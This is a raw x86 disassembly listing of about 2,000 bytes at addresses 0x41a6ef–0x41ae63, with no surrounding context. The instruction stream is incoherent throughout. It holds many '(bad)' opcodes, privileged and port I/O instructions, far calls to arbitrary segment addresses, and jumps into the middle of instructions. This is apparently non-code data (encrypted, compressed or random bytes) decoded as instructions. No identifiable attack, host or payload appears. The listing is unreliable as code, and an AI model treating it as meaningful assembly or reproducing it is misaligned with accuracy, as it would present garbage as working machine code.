  41a6ef:	arpl   WORD PTR [ecx+0x9],ax
  41a6f2:	push   edi
  41a6f3:	cmp    DWORD PTR [edi+0x76],ecx
  41a6f6:	mov    eax,0xc94d855
  41a6fb:	and    BYTE PTR [esi+0x5d],0x82
  41a6ff:	push   edx
  41a700:	jp     0x41a722
  41a702:	push   0x4a
  41a704:	fwait
  41a705:	add    eax,0x362e905e
  41a70a:	pop    es
  41a70b:	xor    DWORD PTR [edi-0x1],0x5a
  41a70f:	sub    ecx,DWORD PTR [ebx+0x62a708a7]
  41a715:	push   edi
  41a716:	enter  0xd93e,0xfb
  41a71a:	adc    esi,esp
  41a71c:	jb     0x41a774
  41a71e:	in     al,0xea
  41a720:	pop    ds
  41a721:	stos   DWORD PTR es:[edi],eax
  41a722:	psllq  mm2,mm2
  41a725:	sti    
  41a726:	mov    edi,0xb9aa2e9d
  41a72b:	inc    edi
  41a72c:	lea    eax,[esi]
  41a72e:	mov    ch,0xd9
  41a730:	call   0x5df7e7c5
  41a735:	sar    DWORD PTR [edi],0xd9
  41a738:	sbb    BYTE PTR [esi+ebx*8],ch
  41a73b:	out    dx,eax
  41a73c:	mov    eax,ds:0x4b2f041b
  41a741:	jge    0x41a6ea
  41a743:	in     al,dx
  41a744:	push   edx
  41a745:	push   ds
  41a746:	push   cs
  41a747:	sub    DWORD PTR [edx-0x57],esp
  41a74a:	mul    BYTE PTR [edi+ebp*2]
  41a74d:	addr16 pop ecx
  41a74f:	push   eax
  41a750:	pushf  
  41a751:	cmp    ebx,DWORD PTR [edi+0x80ea569]
  41a757:	iret   
  41a758:	push   cs
  41a759:	sub    dl,0xd3
  41a75c:	rol    DWORD PTR [eax-0x76bf5e6a],0xe
  41a763:	jp     0x41a714
  41a765:	push   edx
  41a766:	outs   dx,BYTE PTR ds:[esi]
  41a767:	xchg   edi,eax
  41a768:	pop    es
  41a769:	mov    dl,0xa8
  41a76b:	cmp    esi,DWORD PTR [edx]
  41a76d:	fmul   QWORD PTR [edi]
  41a76f:	ins    DWORD PTR es:[edi],dx
  41a770:	mov    ecx,0x8f4e3e9b
  41a775:	inc    esp
  41a776:	loop   0x41a7e7
  41a778:	mov    ebx,0xed5b5c5a
  41a77d:	shl    BYTE PTR [ecx+0xdb8de5a],0xf3
  41a784:	jbe    0x41a804
  41a786:	stc    
  41a787:	jne    0x41a76d
  41a789:	mov    al,ds:0x1040e78c
  41a78e:	lods   al,BYTE PTR ds:[esi]
  41a78f:	aam    0xd6
  41a791:	out    0xa3,eax
  41a793:	std    
  41a794:	sub    dh,BYTE PTR [edi+0x7d47037c]
  41a79a:	aad    0xd2
  41a79c:	ret    
  41a79d:	(bad)  
  41a79f:	hlt    
  41a7a0:	jb     0x41a7ed
  41a7a2:	sub    BYTE PTR [eax],0x9
  41a7a5:	std    
  41a7a6:	add    al,0xf4
  41a7a8:	and    dh,cl
  41a7aa:	inc    ebp
  41a7ab:	cmc    
  41a7ac:	fild   WORD PTR [ebx]
  41a7ae:	popf   
  41a7af:	sub    bl,BYTE PTR [ecx-0x40e2fc02]
  41a7b5:	daa    
  41a7b6:	(bad)  
  41a7b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7b8:	push   0x62d03716
  41a7bd:	and    esi,ebx
  41a7bf:	push   ds
  41a7c0:	xchg   edx,ebx
  41a7c2:	pop    esp
  41a7c3:	fs arpl di,dx
  41a7c6:	xchg   esp,eax
  41a7c7:	add    esi,ecx
  41a7c9:	ins    BYTE PTR es:[edi],dx
  41a7ca:	push   ds
  41a7cb:	in     eax,0xb7
  41a7cd:	xor    eax,0xdd05d95c
  41a7d2:	mov    al,ds:0x77897785
  41a7d7:	call   0x67995436
  41a7dc:	loop   0x41a821
  41a7de:	inc    edx
  41a7df:	xchg   edi,eax
  41a7e0:	cmp    BYTE PTR [eax],0x42
  41a7e3:	mov    al,dh
  41a7e5:	test   BYTE PTR [edx+0x49],ch
  41a7e8:	mov    ebx,0x31e580f0
  41a7ed:	cmp    eax,0x6e1390b8
  41a7f2:	xchg   DWORD PTR [eax],ebp
  41a7f4:	xchg   ecx,eax
  41a7f5:	popf   
  41a7f6:	sahf   
  41a7f7:	or     al,0xdd
  41a7fa:	add    BYTE PTR [edi],dh
  41a7fc:	push   eax
  41a7fd:	dec    edi
  41a7fe:	sbb    DWORD PTR [ebp+0x7a1ee4e2],ecx
  41a804:	ret    
  41a805:	and    ebx,DWORD PTR [edx]
  41a807:	mov    cl,0xe9
  41a809:	ficomp DWORD PTR [ebp+0x2b4d6ea]
  41a80f:	pusha  
  41a810:	sub    bh,bl
  41a812:	and    eax,0x36
  41a815:	(bad)  
  41a816:	cmc    
  41a817:	addr16 adc al,0xa3
  41a81a:	adc    DWORD PTR [ecx],ebx
  41a81c:	rcr    DWORD PTR [eax-0x685eaae4],cl
  41a822:	jg     0x41a89a
  41a824:	dec    DWORD PTR [ebx]
  41a826:	test   al,0xc9
  41a828:	pop    ecx
  41a829:	sbb    esi,esp
  41a82b:	adc    al,0xc3
  41a82d:	xchg   DWORD PTR [eax-0x489a684e],ebx
  41a833:	das    
  41a834:	shr    DWORD PTR [esi-0x65495d9f],cl
  41a83a:	es cs je 0x41a84c
  41a83e:	push   ebx
  41a83f:	pop    es
  41a840:	xor    al,0xa5
  41a842:	and    eax,0x1dfdc9d2
  41a847:	mov    edx,0xb5312619
  41a84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a84d:	add    al,BYTE PTR [ebp-0x3]
  41a850:	sbb    DWORD PTR [edx+0xb],ebx
  41a853:	fwait
  41a854:	fwait
  41a855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a856:	es (bad) 
  41a858:	adc    eax,0xe10f4b17
  41a85d:	mov    DWORD PTR [ecx],0xa5be2d7c
  41a863:	and    edi,edi
  41a865:	data16 jns 0x41a7e9
  41a868:	xchg   ecx,eax
  41a869:	inc    edx
  41a86a:	ror    BYTE PTR [ebx-0x49],1
  41a86d:	repnz inc ebp
  41a86f:	aam    0xc9
  41a871:	and    al,0xb1
  41a873:	daa    
  41a874:	mov    dl,0x87
  41a876:	imul   eax,DWORD PTR [edi+0x70],0x2c
  41a87a:	stos   BYTE PTR es:[edi],al
  41a87b:	pop    edx
  41a87c:	adc    BYTE PTR [edx],bh
  41a87e:	sub    BYTE PTR [ecx-0x5c8e6c01],bl
  41a884:	test   eax,0xbf88da9c
  41a889:	in     al,0xae
  41a88b:	and    DWORD PTR [edi],edi
  41a88d:	arpl   WORD PTR [ecx-0x2a],ax
  41a890:	adc    bl,BYTE PTR [eax+0x25]
  41a893:	jb     0x41a834
  41a895:	or     ebp,DWORD PTR [esi-0x2f]
  41a898:	cmp    eax,edx
  41a89a:	sbb    dl,BYTE PTR [esi-0x432ae972]
  41a8a0:	push   esp
  41a8a1:	mov    bl,0x29
  41a8a3:	adc    BYTE PTR [edx+edi*8-0x4bb1580b],dl
  41a8aa:	push   0xaf6147f2
  41a8af:	or     al,0xb
  41a8b1:	inc    edi
  41a8b2:	push   es
  41a8b3:	mov    ds:0xe378a33b,eax
  41a8b8:	adc    bl,BYTE PTR [ecx-0xe]
  41a8bb:	(bad)  
  41a8bc:	out    dx,eax
  41a8bd:	mov    esp,0xcec28aba
  41a8c2:	push   es
  41a8c3:	mov    edx,0xae0fc3b4
  41a8c8:	aam    0x3
  41a8ca:	enter  0x12e5,0x97
  41a8ce:	jno    0x41a927
  41a8d0:	inc    ebp
  41a8d1:	ins    DWORD PTR es:[edi],dx
  41a8d2:	test   eax,0xca5237e9
  41a8d7:	add    DWORD PTR [edi+ebp*1-0x4f],ecx
  41a8db:	out    dx,eax
  41a8dc:	adc    ch,cl
  41a8de:	ja     0x41a92a
  41a8e0:	lahf   
  41a8e1:	sbb    al,0xf4
  41a8e3:	or     edi,esp
  41a8e5:	dec    ebp
  41a8e6:	jecxz  0x41a87c
  41a8e8:	dec    esp
  41a8e9:	call   0xdbcd46da
  41a8ee:	not    DWORD PTR [esi]
  41a8f0:	xchg   edx,eax
  41a8f1:	(bad)  
  41a8f2:	mov    edx,0xd4c81a0
  41a8f7:	pop    ebp
  41a8f8:	pop    edi
  41a8f9:	xchg   edi,eax
  41a8fa:	aas    
  41a8fb:	(bad)  
  41a8fc:	aad    0xc2
  41a8fe:	xchg   esi,eax
  41a8ff:	lea    ebx,[ebp-0x5e]
  41a902:	call   0xeeb9:0xfda7c56a
  41a909:	imul   ebp,DWORD PTR [ecx+0x64],0x7a
  41a90d:	jo     0x41a904
  41a90f:	dec    ebx
  41a910:	inc    edi
  41a911:	pop    ebx
  41a912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a913:	arpl   WORD PTR [ebx+0x141e24d3],di
  41a919:	call   0x9b08:0x260753eb
  41a920:	xor    dh,dl
  41a922:	push   ecx
  41a923:	adc    eax,0xbe2bb37
  41a928:	repz mov cl,0x13
  41a92b:	mov    ebp,0x149b7432
  41a930:	cmp    BYTE PTR es:[edx-0x24],cl
  41a934:	sbb    al,0x71
  41a936:	lods   eax,DWORD PTR ds:[esi]
  41a937:	pop    edx
  41a938:	or     DWORD PTR [ebx+edx*1-0x60],ecx
  41a93c:	or     eax,0x5ed8fe98
  41a941:	xor    al,dh
  41a943:	aad    0x62
  41a945:	mov    edx,0xed88043a
  41a94a:	inc    eax
  41a94b:	ja     0x41a9c8
  41a94d:	ins    DWORD PTR es:[edi],dx
  41a94e:	scas   eax,DWORD PTR es:[edi]
  41a94f:	xchg   ebx,eax
  41a950:	xor    al,0xd1
  41a952:	rcr    DWORD PTR [edx-0x68ccf9dd],cl
  41a958:	pop    esi
  41a959:	cmp    BYTE PTR [ecx-0x7d6fac46],bh
  41a95f:	push   ebp
  41a960:	mov    esi,ebx
  41a962:	(bad)  
  41a963:	scas   eax,DWORD PTR es:[edi]
  41a964:	push   esi
  41a965:	xchg   esp,eax
  41a966:	pop    esp
  41a967:	int    0x35
  41a969:	dec    ebp
  41a96a:	sbb    ah,dl
  41a96c:	mov    WORD PTR [edi-0x5a],?
  41a96f:	jp     0x41a97c
  41a971:	popf   
  41a972:	(bad)  
  41a973:	out    0xaa,al
  41a975:	push   ss
  41a976:	jle    0x41a90f
  41a978:	loopne 0x41a8ff
  41a97a:	push   0x5a
  41a97c:	sbb    eax,0x84927887
  41a981:	or     BYTE PTR [edi],al
  41a983:	call   0xc7d9:0xd88db01
  41a98a:	gs je  0x41a939
  41a98d:	(bad)  
  41a98e:	cvtps2pd xmm7,xmm6
  41a991:	jg     0x41a968
  41a993:	lahf   
  41a994:	pop    es
  41a995:	mov    dl,0xa1
  41a997:	add    edi,DWORD PTR [ecx+0x44c5196c]
  41a99d:	shr    BYTE PTR [esi],cl
  41a99f:	mov    ah,0x4
  41a9a1:	ret    
  41a9a2:	jno    0x41aa04
  41a9a4:	inc    ebx
  41a9a5:	and    dh,BYTE PTR [edi-0x9b732fa]
  41a9ab:	xlat   BYTE PTR ds:[ebx]
  41a9ac:	aaa    
  41a9ad:	out    dx,eax
  41a9ae:	pusha  
  41a9af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9b0:	neg    BYTE PTR [ecx]
  41a9b2:	xchg   edi,eax
  41a9b3:	(bad)  
  41a9b4:	cwde   
  41a9b5:	push   cs
  41a9b6:	push   ebx
  41a9b7:	push   0xa91e517a
  41a9bc:	jbe    0x41a97a
  41a9be:	xchg   DWORD PTR [edi+0x59ffdc90],esi
  41a9c4:	call   0x4ebb:0x67e68a09
  41a9cb:	sar    DWORD PTR [eax+0x47],cl
  41a9ce:	or     dh,0xeb
  41a9d1:	lods   al,BYTE PTR ds:[esi]
  41a9d2:	push   ecx
  41a9d3:	stos   DWORD PTR es:[edi],eax
  41a9d4:	(bad)  
  41a9d5:	mov    dh,0x6e
  41a9d7:	cmp    edi,DWORD PTR [eax-0x3b]
  41a9da:	sbb    eax,0x321616d4
  41a9df:	push   0x56ce9a20
  41a9e4:	es jno 0x41aa4b
  41a9e7:	xchg   ecx,eax
  41a9e8:	inc    esp
  41a9e9:	jne    0x41aa23
  41a9eb:	in     al,0x8c
  41a9ed:	(bad)  
  41a9ee:	jmp    0x53bd:0xdf539dbd
  41a9f5:	and    ebx,ebp
  41a9f7:	(bad)  
  41a9f8:	and    edi,DWORD PTR [eax]
  41a9fa:	(bad)  [eax-0x5]
  41a9fd:	mov    ebp,0x9db9d2d0
  41aa02:	cmp    esp,DWORD PTR [ebx-0x6c]
  41aa05:	or     al,0x78
  41aa07:	xchg   ebx,eax
  41aa08:	out    dx,eax
  41aa09:	(bad)  
  41aa0a:	inc    BYTE PTR [edi+0xed1ac91]
  41aa10:	(bad)  
  41aa11:	shl    BYTE PTR [edi-0x80],cl
  41aa14:	daa    
  41aa15:	push   edx
  41aa16:	xchg   ebp,eax
  41aa17:	ds fwait
  41aa19:	mov    ds:0x7aec2bf9,al
  41aa1e:	jl     0x41aa52
  41aa20:	add    edx,edi
  41aa22:	jbe    0x41aa66
  41aa24:	pushf  
  41aa25:	mov    ds:0xf9042dd7,al
  41aa2a:	ficom  WORD PTR [ecx-0x1d9bc9da]
  41aa30:	rcr    ah,1
  41aa32:	sub    dl,ah
  41aa34:	sub    edx,edx
  41aa36:	mov    dl,0xc6
  41aa38:	jge    0x41aa3d
  41aa3a:	dec    ch
  41aa3c:	dec    eax
  41aa3d:	fs into 
  41aa3f:	int3   
  41aa40:	push   ecx
  41aa41:	fnsave [ecx+eax*1-0x4c1e0b81]
  41aa48:	cmp    al,BYTE PTR [eax]
  41aa4a:	pop    edx
  41aa4b:	push   0x7e
  41aa4d:	or     al,BYTE PTR [edi+0x44e02003]
  41aa53:	cwde   
  41aa54:	lahf   
  41aa55:	cli    
  41aa56:	push   0x2b7aa329
  41aa5b:	mov    edx,ebp
  41aa5d:	add    dl,BYTE PTR [edx]
  41aa5f:	inc    ecx
  41aa60:	mov    bl,0xf4
  41aa62:	(bad)  
  41aa63:	mov    ecx,0x55fe8052
  41aa68:	fnstcw WORD PTR [eax+0x7e]
  41aa6b:	ffreep st(1)
  41aa6d:	mov    DWORD PTR [esp+edx*2+0x517cfd9c],esi
  41aa74:	cmp    BYTE PTR [ebp-0x27],0xda
  41aa78:	xor    al,0x2e
  41aa7a:	and    BYTE PTR [eax],dh
  41aa7c:	adc    al,0x18
  41aa7e:	scas   eax,DWORD PTR es:[edi]
  41aa7f:	ss mov edi,0x622fd973
  41aa85:	lock and BYTE PTR [ebx-0x3d],ah
  41aa89:	(bad)  
  41aa8a:	call   0x9b8eb12f
  41aa8f:	int3   
  41aa90:	pop    es
  41aa91:	ins    DWORD PTR es:[edi],dx
  41aa92:	push   0xffffff9a
  41aa94:	mov    eax,0x1b3f5da3
  41aa99:	mov    ecx,0x149aa478
  41aa9e:	inc    eax
  41aa9f:	pop    edx
  41aaa0:	sbb    esi,edx
  41aaa2:	popf   
  41aaa3:	mov    ebp,0x3ee06d8a
  41aaa8:	pop    edx
  41aaa9:	sti    
  41aaaa:	cmp    BYTE PTR es:[ecx],0x2e
  41aaae:	push   es
  41aaaf:	das    
  41aab0:	jp     0x41aa73
  41aab2:	cmc    
  41aab3:	mov    ebx,0x36a53efc
  41aab8:	jb     0x41aa4d
  41aaba:	loopne 0x41ab0d
  41aabc:	xor    BYTE PTR [edx-0x6a],ch
  41aabf:	imul   esi,DWORD PTR [ebp+0x70],0x15f64a95
  41aac6:	pop    eax
  41aac7:	neg    DWORD PTR [eax+0x54911a21]
  41aacd:	in     eax,dx
  41aace:	pop    ss
  41aacf:	fisttp DWORD PTR ds:[eax]
  41aad2:	mov    al,al
  41aad4:	stos   BYTE PTR es:[edi],al
  41aad5:	push   ss
  41aad6:	push   eax
  41aad7:	mov    ds,WORD PTR [edx+esi*4+0x696abc7b]
  41aade:	lahf   
  41aadf:	adc    al,0xbf
  41aae1:	sbb    eax,0xf76c768d
  41aae6:	pop    es
  41aae7:	or     eax,0xe657d910
  41aaec:	add    ebp,edx
  41aaee:	push   cs
  41aaef:	or     ecx,DWORD PTR [esi]
  41aaf1:	mov    ch,0x12
  41aaf3:	xchg   ecx,eax
  41aaf4:	mov    ch,0x37
  41aaf6:	ja     0x41aa81
  41aaf8:	push   ss
  41aaf9:	add    al,0xf1
  41aafb:	mov    bh,ah
  41aafd:	and    esp,DWORD PTR ds:0xd870e53e
  41ab03:	repz jb 0x41ab71
  41ab06:	arpl   WORD PTR [ebp-0x17],bp
  41ab09:	test   al,cl
  41ab0b:	imul   esi,DWORD PTR [ebx-0x3b495817],0xdb13d913
  41ab15:	ret    
  41ab16:	ins    DWORD PTR es:[edi],dx
  41ab17:	jae    0x41aafb
  41ab19:	jae    0x41ab49
  41ab1b:	and    al,0x1f
  41ab1d:	mov    ds:0xf67dbdbc,eax
  41ab22:	cli    
  41ab23:	jb     0x41aaf8
  41ab25:	sub    eax,0x5fb065ed
  41ab2a:	addr16 xchg ebp,eax
  41ab2c:	inc    ecx
  41ab2d:	mov    esi,0xb5feb725
  41ab32:	mov    bh,0xb4
  41ab34:	inc    edx
  41ab35:	lea    esi,[esi+0x32]
  41ab38:	ins    BYTE PTR es:[edi],dx
  41ab39:	dec    ecx
  41ab3a:	push   es
  41ab3b:	mov    eax,0x3ef1f355
  41ab40:	retf   
  41ab41:	call   0x5859:0x35891c57
  41ab48:	lds    eax,FWORD PTR [ebx-0x36]
  41ab4b:	cmp    al,ch
  41ab4d:	pop    ss
  41ab4e:	pop    ebx
  41ab4f:	xchg   ecx,eax
  41ab50:	popa   
  41ab51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab52:	div    DWORD PTR [edx-0x56]
  41ab55:	ins    DWORD PTR es:[edi],dx
  41ab56:	jecxz  0x41aae3
  41ab58:	test   BYTE PTR [esi-0x41bf22b7],cl
  41ab5e:	and    DWORD PTR [eax+0x44],eax
  41ab61:	shr    DWORD PTR [eax+0x14],0x67
  41ab65:	loope  0x41ab2f
  41ab67:	ins    DWORD PTR es:[edi],dx
  41ab68:	out    0x32,al
  41ab6a:	mov    al,ds:0x711004e2
  41ab6f:	sbb    edx,ecx
  41ab71:	and    dl,BYTE PTR [edi-0x24]
  41ab74:	cwde   
  41ab75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab76:	iret   
  41ab77:	repz test al,0x37
  41ab7a:	sub    DWORD PTR [ebx-0x5cadd69e],edi
  41ab80:	mov    BYTE PTR [ebx-0x6ada3fe0],dl
  41ab86:	pushf  
  41ab87:	or     bl,BYTE PTR [edi]
  41ab89:	push   esp
  41ab8a:	lds    esp,FWORD PTR [eax+0x9]
  41ab8d:	clc    
  41ab8e:	mov    ch,0x46
  41ab90:	out    dx,al
  41ab91:	dec    esi
  41ab92:	sub    ebx,esp
  41ab94:	sub    BYTE PTR ds:0x51c1d321,cl
  41ab9a:	cmp    eax,0xeaf03a61
  41ab9f:	push   ebx
  41aba0:	daa    
  41aba1:	clc    
  41aba2:	stos   BYTE PTR es:[edi],al
  41aba3:	lock test BYTE PTR gs:[ecx-0x59a34a2d],ch
  41abab:	adc    ecx,DWORD PTR [edx]
  41abad:	cmp    dl,dh
  41abaf:	inc    esp
  41abb0:	call   0xc94e:0xa11949ac
  41abb7:	sbb    BYTE PTR [esi+ecx*2],dh
  41abba:	stc    
  41abbb:	cmp    eax,0x873680a2
  41abc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc1:	push   0x188e23fc
  41abc6:	stos   DWORD PTR es:[edi],eax
  41abc7:	dec    edi
  41abc8:	out    0x1a,al
  41abca:	enter  0x2d44,0xc0
  41abce:	aad    0xe1
  41abd0:	jns    0x41ab77
  41abd2:	mov    dh,0x9a
  41abd4:	adc    cl,BYTE PTR [esp+ebx*1+0x67]
  41abd8:	dec    ebp
  41abd9:	(bad)  
  41abda:	mov    ah,0x1f
  41abdc:	mov    edx,0x84560015
  41abe1:	xchg   DWORD PTR [ebx+0x4],ebp
  41abe4:	pop    ecx
  41abe5:	int3   
  41abe6:	push   es
  41abe7:	int3   
  41abe8:	push   0xe513ffb5
  41abed:	fisubr DWORD PTR [eax]
  41abef:	lgs    edi,FWORD PTR [ebx+ecx*8+0x2269db1c]
  41abf7:	mov    eax,0xd822d9a
  41abfc:	call   FWORD PTR [edx+ebx*8-0xf]
  41ac00:	enter  0x3e14,0xd0
  41ac04:	and    BYTE PTR [ecx+0x59],bh
  41ac07:	jbe    0x41abab
  41ac09:	push   0x76
  41ac0b:	mov    bh,0xda
  41ac0d:	fmul   st(0),st
  41ac0f:	fnop   
  41ac11:	mov    bh,cl
  41ac13:	(bad)  
  41ac14:	call   FWORD PTR [edx]
  41ac16:	lods   al,BYTE PTR ds:[esi]
  41ac17:	out    dx,eax
  41ac18:	push   0x3e
  41ac1a:	cmpps  xmm5,XMMWORD PTR [ebx+0x5f771573],0x5c
  41ac22:	xor    al,0xe5
  41ac24:	and    BYTE PTR [eax],ch
  41ac26:	cmp    al,0xde
  41ac28:	mov    esp,0x66ed9aae
  41ac2d:	add    DWORD PTR [ebx-0x2c],ebp
  41ac30:	das    
  41ac31:	and    DWORD PTR [edi+0xa],edx
  41ac34:	jae    0x41ac21
  41ac36:	cmp    eax,DWORD PTR [edx]
  41ac38:	pop    eax
  41ac39:	rcl    esp,0x70
  41ac3c:	pop    edi
  41ac3d:	test   eax,0x64d6ed58
  41ac42:	push   es
  41ac43:	mov    ecx,0x8213aee0
  41ac48:	sub    al,0xbe
  41ac4a:	xor    eax,0xbaf08c2f
  41ac4f:	inc    esi
  41ac50:	fist   WORD PTR [ebp-0x6ed32619]
  41ac56:	mov    ds:0xcce58891,al
  41ac5b:	leave  
  41ac5c:	add    dl,BYTE PTR [ebx]
  41ac5e:	je     0x41ac4b
  41ac60:	dec    ebp
  41ac61:	cs push ss
  41ac63:	inc    ecx
  41ac64:	cwde   
  41ac65:	pusha  
  41ac66:	xchg   ebp,eax
  41ac67:	cs (bad) 
  41ac69:	sbb    bl,BYTE PTR [eax-0x70]
  41ac6c:	pop    es
  41ac6d:	ds dec esi
  41ac6f:	dec    eax
  41ac70:	je     0x41ac3c
  41ac72:	jecxz  0x41ac91
  41ac74:	jle    0x41ace8
  41ac76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac77:	ret    0xa301
  41ac7a:	adc    ecx,DWORD PTR [eax]
  41ac7c:	(bad)  
  41ac7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac7e:	icebp  
  41ac7f:	aad    0xad
  41ac81:	xor    al,0x65
  41ac83:	xor    eax,0x8847a5f8
  41ac88:	inc    esp
  41ac89:	call   0x3c200020
  41ac8e:	pop    edx
  41ac8f:	in     eax,dx
  41ac90:	mov    esp,cr0
  41ac93:	cdq    
  41ac94:	fsubp  st(3),st
  41ac96:	imul   esi,ecx,0x65400cb9
  41ac9c:	mov    edi,0xe411e94f
  41aca1:	hlt    
  41aca2:	clc    
  41aca3:	ret    
  41aca4:	push   ss
  41aca5:	inc    edx
  41aca6:	jmp    0x41ad23
  41aca8:	xchg   BYTE PTR [eax],al
  41acaa:	mov    al,ds:0x5d13ab85
  41acaf:	mov    edx,0xb286ce99
  41acb4:	std    
  41acb5:	icebp  
  41acb6:	loope  0x41ad1d
  41acb8:	jbe    0x41acbb
  41acba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acbb:	xor    bl,BYTE PTR [ebx]
  41acbd:	inc    ebp
  41acbe:	pop    ebp
  41acbf:	pop    es
  41acc0:	jo     0x41ac78
  41acc2:	jo     0x41ace0
  41acc4:	pop    ds
  41acc5:	xchg   esp,eax
  41acc6:	out    0x2d,eax
  41acc8:	mov    esi,0x4e00118c
  41accd:	mov    ah,0x5c
  41accf:	dec    ebx
  41acd0:	mov    DWORD PTR [edi-0xcfe6f8f],eax
  41acd6:	cmp    BYTE PTR [edi],al
  41acd8:	in     al,dx
  41acd9:	xor    bl,BYTE PTR [ebp+0x4a6467b0]
  41acdf:	popa   
  41ace0:	xor    ecx,0x56
  41ace3:	mov    ecx,0xbc9a0a0c
  41ace8:	pusha  
  41ace9:	retf   0x4e68
  41acec:	rcr    bl,1
  41acee:	add    eax,0xe5e3bb90
  41acf3:	out    dx,eax
  41acf4:	push   ecx
  41acf5:	lods   al,BYTE PTR ds:[esi]
  41acf6:	push   ecx
  41acf7:	dec    edx
  41acf8:	hlt    
  41acf9:	or     eax,0x134ab8a4
  41acfe:	pop    ebx
  41acff:	retf   0xd298
  41ad02:	mov    ecx,0x8849e4f7
  41ad07:	xchg   ebx,eax
  41ad08:	pop    edx
  41ad09:	adc    bl,dh
  41ad0b:	or     BYTE PTR [edx+0x52ddd85b],0x5
  41ad12:	test   BYTE PTR [esi+ebx*1+0x40],cl
  41ad16:	mov    esp,0x984487e6
  41ad1b:	mov    bh,0xba
  41ad1d:	pop    edx
  41ad1e:	sub    ebp,DWORD PTR [edi-0x55c0130c]
  41ad24:	and    al,0x77
  41ad26:	inc    eax
  41ad27:	push   ebx
  41ad28:	out    0xa8,eax
  41ad2a:	adc    ebp,DWORD PTR [ecx]
  41ad2c:	scas   eax,DWORD PTR es:[edi]
  41ad2d:	push   edx
  41ad2e:	jmp    0x41ad97
  41ad30:	add    DWORD PTR [edi-0x4],0x2918e8e7
  41ad37:	inc    esi
  41ad38:	add    ebp,ecx
  41ad3a:	and    dh,BYTE PTR [eax-0x66bdd0ca]
  41ad40:	aaa    
  41ad41:	pusha  
  41ad42:	pop    edi
  41ad43:	adc    al,0xb2
  41ad45:	jo     0x41acff
  41ad47:	fsubr  QWORD PTR [eax+0x57]
  41ad4a:	push   edi
  41ad4b:	fcomi  st,st(6)
  41ad4d:	or     eax,0xb06080d6
  41ad52:	popa   
  41ad53:	cmp    eax,0x3c0b522f
  41ad58:	mov    WORD PTR [eax-0x730bb0c5],?
  41ad5e:	jno    0x41ad13
  41ad60:	retf   0x642f
  41ad63:	(bad)  
  41ad64:	test   eax,0xbfd3ebf5
  41ad69:	jl     0x41ad1a
  41ad6b:	repnz fidivr DWORD PTR [edi+edx*4-0x14921d4e]
  41ad73:	push   es
  41ad74:	dec    eax
  41ad75:	sbb    ebx,edx
  41ad77:	adc    DWORD PTR [edi+0x31010ef3],ebp
  41ad7d:	mov    ecx,0xc88f53ec
  41ad82:	call   DWORD PTR [ebp+0x424dae7d]
  41ad88:	rcr    BYTE PTR [edx+0x3472ca3e],0xb1
  41ad8f:	retf   0xfa65
  41ad92:	mov    ebx,0x4a774859
  41ad97:	inc    ebp
  41ad98:	(bad)  
  41ad99:	adc    ah,dl
  41ad9b:	je     0x41ad51
  41ad9d:	pusha  
  41ad9e:	es icebp 
  41ada0:	xchg   DWORD PTR [edi-0x3ea7c790],esp
  41ada6:	retf   
  41ada7:	jbe    0x41adef
  41ada9:	pop    ebx
  41adaa:	pop    eax
  41adab:	dec    ebp
  41adac:	push   ds
  41adad:	mov    eax,0x9a2f39c1
  41adb2:	pop    ebx
  41adb3:	mov    eax,0xc01bc1b3
  41adb8:	add    DWORD PTR [edi+esi*8-0x46],ebx
  41adbc:	in     eax,dx
  41adbd:	dec    ecx
  41adbe:	cmp    BYTE PTR [edi],dl
  41adc0:	bound  edi,QWORD PTR [ebx-0x6e902129]
  41adc6:	mov    ecx,0xb973e1ab
  41adcb:	mov    ecx,0x9ff80298
  41add0:	loopne 0x41ad56
  41add2:	dec    eax
  41add3:	sbb    DWORD PTR [ebx+0x4b],eax
  41add6:	repnz or DWORD PTR fs:0x9b420e7f,esp
  41adde:	pop    esp
  41addf:	int    0xf7
  41ade1:	adc    bh,BYTE PTR [edi]
  41ade3:	iret   
  41ade4:	js     0x41ae2c
  41ade6:	pop    ds
  41ade7:	sahf   
  41ade8:	scas   al,BYTE PTR es:[edi]
  41ade9:	aam    0x4f
  41adeb:	in     al,0x17
  41aded:	loop   0x41aded
  41adef:	outs   dx,BYTE PTR ds:[esi]
  41adf0:	xor    ecx,DWORD PTR gs:[ebx+0x60]
  41adf4:	mov    ?,WORD PTR [edi]
  41adf6:	fst    DWORD PTR [esi+0x17b97b56]
  41adfc:	mov    bh,0xc1
  41adfe:	fsub   DWORD PTR [ebp-0x40cf8bce]
  41ae04:	fmul   DWORD PTR [eax-0x35324300]
  41ae0a:	nop
  41ae0b:	sub    eax,0x15522df4
  41ae10:	je     0x41ade2
  41ae12:	mov    esp,0x2313e62f
  41ae17:	retf   0xb7a9
  41ae1a:	(bad)  
  41ae1b:	in     eax,dx
  41ae1c:	jns    0x41ae30
  41ae1e:	arpl   WORD PTR [edi],dx
  41ae20:	lods   al,BYTE PTR ds:[esi]
  41ae21:	and    BYTE PTR [edi],0xc4
  41ae24:	(bad)  
  41ae25:	(bad)  
  41ae26:	rol    ah,cl
  41ae28:	and    eax,DWORD PTR [edi+0xf09c892]
  41ae2e:	sbb    BYTE PTR [eax-0x25],dl
  41ae31:	mov    cl,0xed
  41ae33:	shl    BYTE PTR [ebp-0x3e],0xb2
  41ae37:	push   0x26365095
  41ae3c:	loope  0x41ae91
  41ae3e:	mov    eax,ds:0x40e9017
  41ae43:	cwde   
  41ae44:	xchg   edi,eax
  41ae45:	dec    eax
  41ae46:	pusha  
  41ae47:	sbb    BYTE PTR [edi-0x21da0b16],dh
  41ae4d:	mov    eax,0xdc354a30
  41ae52:	retf   0x849c
  41ae55:	add    esi,DWORD PTR [ecx+0x6a]
  41ae58:	es push ebx
  41ae5a:	arpl   WORD PTR [ebx],ax
  41ae5c:	in     al,dx
  41ae5d:	dec    edx
  41ae5e:	pop    es
  41ae5f:	sub    al,0xd9
  41ae61:	jo     0x41ae7e
  41ae63:	ins    DWORD PTR es:[edi],dx
